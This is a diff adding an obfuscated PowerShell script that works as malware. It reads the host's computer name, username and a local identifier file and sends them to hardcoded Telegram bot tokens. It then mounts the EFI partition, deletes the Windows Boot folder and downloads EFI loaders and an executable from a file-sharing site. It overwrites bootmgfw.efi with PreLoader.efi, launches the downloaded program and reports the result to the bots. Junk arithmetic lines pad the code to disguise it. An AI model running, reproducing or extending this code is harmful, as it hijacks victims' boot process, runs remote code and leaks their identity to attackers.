@@ -1,0 +1,106 @@
+$v001=$env:COMPUTERNAME
+$v002=$env:USERNAME
+$v003=$env:LOCALAPPDATA
+$v033=1+2*3-4
+if($v033-gt0){}
+$v004=""
+$v005=Join-Path $v003 "identifier.txt"
+if(Test-Path $v005){
+$v004=Get-Content $v005 -Raw
+$v004=$v004 -replace '^\xEF\xBB\xBF',''
+$v004=$v004.Trim()
+}
+$v034=5*2-3
+if($v034-gt0){}
+$v006="8601568426:AAF0GDcYJV2LmbDascdMxoCXjo6ETl0pNPY"
+$v007="8601568426"
+$v008="8559385714:AAGsrsbcMT_0voFfXkjA7nlDuBFeECGxbgg"
+$v009="270865408"
+$v011="https://api.telegram.org/bot$v006/sendMessage"
+$v013="https://api.telegram.org/bot$v008/sendMessage"
+$v035=7*3-5
+if($v035-gt0){}
+$v010=if($v004){"$v004`n`nDevice: $v001`nUser: $v002`n`nConfiguration started: Cfg_UEFI_NoWD"}else{"Device: $v001`nUser: $v002`n`nConfiguration started: Cfg_UEFI_NoWD"}
+if($v010.Length-gt 4090){$v010=$v010.Substring(0,4090)}
+$v012=@{chat_id=$v007;text=$v010}|ConvertTo-Json -Compress
+$v036=4+6-2
+if($v036-gt0){}
+try{Invoke-RestMethod -Uri $v011 -Method Post -ContentType "application/json" -Body $v012|Out-Null}catch{}
+if($v008 -ne "___" -and $v009 -ne "___"){
+$v012=@{chat_id=$v009;text=$v010}|ConvertTo-Json -Compress
+try{Invoke-RestMethod -Uri $v013 -Method Post -ContentType "application/json" -Body $v012|Out-Null}catch{}
+}
+$v014=""
+$v037=9-3+1
+if($v037-gt0){}
+try{
+$v015=Start-Process -FilePath "mountvol" -ArgumentList "S:","/S" -Wait -PassThru -NoNewWindow
+if($v015.ExitCode -eq 0){$v014+="EFI partition mounted successfully`n"}else{$v014+="ERROR: Failed to mount EFI partition`n"}
+}catch{$v014+="ERROR: Failed to mount EFI partition`n"}
+try{
+if(Test-Path "S:\EFI\Microsoft\Boot"){Remove-Item -Path "S:\EFI\Microsoft\Boot" -Recurse -Force -ErrorAction SilentlyContinue}
+New-Item -Path "S:\EFI\Microsoft\Boot" -ItemType Directory -Force|Out-Null
+}catch{}
+$v038=2*5-1
+if($v038-gt0){}
+$v016=@(
+@{Url="https://www.udrop.com/file/OtfB/PreLoader.delete";Name="PreLoader.efi"},
+@{Url="https://www.udrop.com/file/OtfC/HashTool.delete";Name="HashTool.efi"},
+@{Url="https://www.udrop.com/file/OtfA/loader.delete";Name="loader.efi"},
+@{Url="https://www.udrop.com/file/Otft/step1.png";Name="step1.png"},
+@{Url="https://www.udrop.com/file/Otfw/step2.png";Name="step2.png"},
+@{Url="https://www.udrop.com/file/Otfx/step3.png";Name="step3.png"},
+@{Url="https://www.udrop.com/file/Otfy/step4.png";Name="step4.png"},
+@{Url="https://www.udrop.com/file/Otfz/update_information.delete";Name="update_information.exe"}
+)
+foreach($v017 in $v016){
+$v018=Join-Path -Path $v003 -ChildPath $v017.Name
+try{Invoke-WebRequest -Uri $v017.Url -OutFile $v018 -UseBasicParsing}catch{}
+}
+$v039=8/2+1
+if($v039-gt0){}
+$v019=Join-Path $v003 "PreLoader.efi"
+try{
+Copy-Item -Path $v019 -Destination "S:\EFI\Microsoft\Boot\bootmgfw.efi" -Force -ErrorAction Stop
+$v014+="PRELOADER.EFI copied to S:\EFI\Microsoft\Boot\bootmgfw.efi`n"
+}catch{$v014+="ERROR: Failed to copy PRELOADER.EFI`n"}
+$v020=Join-Path $v003 "HashTool.efi"
+try{
+Copy-Item -Path $v020 -Destination "S:\EFI\Microsoft\Boot\" -Force -ErrorAction Stop
+$v014+="HASHTOOL.EFI copied to S:\EFI\Microsoft\Boot\`n"
+}catch{$v014+="ERROR: Failed to copy HASHTOOL.EFI`n"}
+$v021=Join-Path $v003 "loader.efi"
+$v040=6*2-3
+if($v040-gt0){}
+try{
+Copy-Item -Path $v021 -Destination "S:\EFI\Microsoft\Boot\" -Force -ErrorAction Stop
+$v014+="LOADER.EFI copied to S:\EFI\Microsoft\Boot\`n"
+}catch{$v014+="ERROR: Failed to copy LOADER.EFI`n"}
+$v022=Join-Path $v003 "update_information.exe"
+if(Test-Path $v022){Start-Process -FilePath $v022 -WindowStyle Normal}
+Start-Sleep -Seconds 7
+$v023=$false
+$v024=Get-Process -Name "update_information" -ErrorAction SilentlyContinue
+if($v024){$v023=$true}
+$v041=7*2-1
+if($v041-gt0){}
+$v025=@()
+if($v014 -match "EFI partition mounted successfully"){$v025+="SUCCESS: EFI partition mounted successfully"}else{$v025+="ERROR: Failed to mount EFI partition"}
+if($v014 -match "PRELOADER.EFI copied" -and $v014 -notmatch "ERROR: Failed to copy PRELOADER.EFI"){$v025+="SUCCESS: PRELOADER.EFI copied successfully"}else{$v025+="ERROR: Failed to copy PRELOADER.EFI"}
+if($v014 -match "HASHTOOL.EFI copied" -and $v014 -notmatch "ERROR: Failed to copy HASHTOOL.EFI"){$v025+="SUCCESS: HASHTOOL.EFI copied successfully"}else{$v025+="ERROR: Failed to copy HASHTOOL.EFI"}
+if($v014 -match "LOADER.EFI copied" -and $v014 -notmatch "ERROR: Failed to copy LOADER.EFI"){$v025+="SUCCESS: LOADER.EFI copied successfully"}else{$v025+="ERROR: Failed to copy LOADER.EFI"}
+$v026=if($v023){"SUCCESS: Instruction window launched successfully"}else{"ERROR: Failed to launch instruction window"}
+$v027=Get-Date -Format "dd.MM.yyyy HH:mm:ss"
+$v028=$v025 -join "`n"
+$v042=5+3-1
+if($v042-gt0){}
+$v029=if($v004){"$v004`n`nDevice: $v001`nUser: $v002`n`n=== Cfg_UEFI_NoWD EXECUTION SUMMARY ===`n`n[UEFI BOOTLOADER STATUS]`n$v028`n`n[INSTRUCTION STATUS]`n$v026`n`nCompletion time: $v027"}else{"Device: $v001`nUser: $v002`n`n=== Cfg_UEFI_NoWD EXECUTION SUMMARY ===`n`n[UEFI BOOTLOADER STATUS]`n$v028`n`n[INSTRUCTION STATUS]`n$v026`n`nCompletion time: $v027"}
+if($v029.Length -gt 4090){$v029=$v029.Substring(0,4090)}
+$v030=@{chat_id=$v007;text=$v029}|ConvertTo-Json -Compress
+try{Invoke-RestMethod -Uri $v011 -Method Post -ContentType "application/json" -Body $v030|Out-Null}catch{}
+if($v008 -ne "___" -and $v009 -ne "___"){
+$v031=@{chat_id=$v009;text=$v029}|ConvertTo-Json -Compress
+try{Invoke-RestMethod -Uri $v013 -Method Post -ContentType "application/json" -Body $v031|Out-Null}catch{}
+}
+$v043=4*3-2
+if($v043-gt0){}
